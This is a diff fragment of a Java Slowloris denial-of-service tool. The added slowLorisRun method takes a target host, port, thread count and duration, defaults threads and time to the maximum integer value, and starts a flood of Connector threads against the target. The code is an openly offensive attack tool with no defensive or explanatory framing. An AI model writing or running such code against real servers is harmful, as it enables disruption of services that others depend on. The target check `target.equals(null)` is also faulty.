@@ -7,6 +7,44 @@ import java.net.MalformedURLException;
  */
 public class mainForSlowLoris
 {
+	
+	public void slowLorisRun(String target, int port, int threads, int time)
+	{
+		if(target.equals(null))
+		{
+			System.out.println("You must input a target silly");
+		}
+		if(port == 0)
+		{
+			System.out.println("No port input, using default 80");
+			port = 80;
+		}
+		if(threads == 0)
+		{
+			System.out.println("No number of threads specified, using maximum allowed (UNSTABLE)");
+			threads = 2147483647;
+		}
+		if(time == 0)
+		{
+			System.out.println("No time specified, using maximum");
+			time = 2147483647;
+		}
+		
+		 for(int i = 0; i < threads; i++)
+	        {
+	            try
+	            {
+	                Connector connector = new Connector(target, port, time);
+	                new Thread(connector).start();
+	            }
+	            catch(MalformedURLException mue)
+	            {
+	                die(mue.getMessage()); // fatal error
+	            }
+	        }
+		
+	}
+	
     public static void main(String[] args)
     {
         if(args.length != 4)
